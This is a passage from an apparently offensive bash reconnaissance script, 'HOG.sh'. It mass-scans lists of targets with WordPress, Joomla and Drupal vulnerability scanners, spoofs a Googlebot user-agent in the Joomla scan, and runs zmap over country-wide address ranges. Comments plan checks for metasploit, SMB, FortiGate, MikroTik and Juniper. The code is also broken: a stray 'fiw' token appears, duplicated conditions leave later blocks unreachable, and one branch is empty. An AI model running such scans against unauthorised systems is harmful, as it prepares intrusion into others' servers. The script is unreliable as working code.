if [[ $scan = "wordpress" && ! -z $l && ! -z $o ]]; then
        clear
        mkdir $o
        echo "run HOG.sh -scan $scan  -l $l  -o $o"
        while IFS= read line
        do
        wpscan --url $line >> $o-$line
        done <"$l"
        ls $o* | xargs grep  "vulnerabilities identified"
        exit 1
fiw
# bash HOG.sh -scan joomla -l /tmp/joomfile -o /tmp/output
if [[ $scan = "joomla" && ! -z $l && ! -z $o ]]; then
        clear
        echo "run HOG.sh -scan $scan  -l $l  -o $o"
        while IFS= read line
        do
        joomscan -u $line --user-agent "Googlebot/2.1 (+http://www.googlebot.com/bot.html)" >> $o-$line
        done <"$l"
        exit 1
fi
# bash HOG.sh -scan sharepoint -l /tmp/spfile -o /tmp/output
if [[ $scan = "sharepoint" && ! -z $l && ! -z $o ]]; then
        clear
        echo "run HOG.sh -scan $scan  -l $l  -o $o"
        exit 1
fi
# bash HOG.sh -scan drupal -l /tmp/drupfile -o /tmp/output
if [[ $scan = "drupal" && ! -z $l && ! -z $o ]]; then
        clear
        echo "run HOG.sh -scan $scan  -l $l  -o $o"
        droopescan scan drupal -U $l
        exit 1
fi
# bash HOG.sh -l /tmp/tg -header -o /tmp/header
if [[  $header = "1"  && ! -z $l && ! -z $o ]]; then
        clear
#headers of web servers
        path="/tmp/countryall/"
        zmap -p $p $(cat $path/countryall)  -o $o
        exit 1
fi
if [[  $header = "1"  && ! -z $l && ! -z $o ]]; then
        clear
#metasploit check
        path="/tmp/countryall/"
        zmap -p $p $(cat $path/countryall)  -o $o
        exit 1
fi
if [[  $header = "1"  && ! -z $l && ! -z $o ]]; then
        clear
#subdomain lister
#range of target and subdomains
#metasploit
#check mikrotik
#check smb
#check fortigate
#check juniper
        path="/tmp/countryall/"
        zmap -p $p $(cat $path/countryall)  -o $o
        exit 1
fi
echo " next!"
echo $1 $2

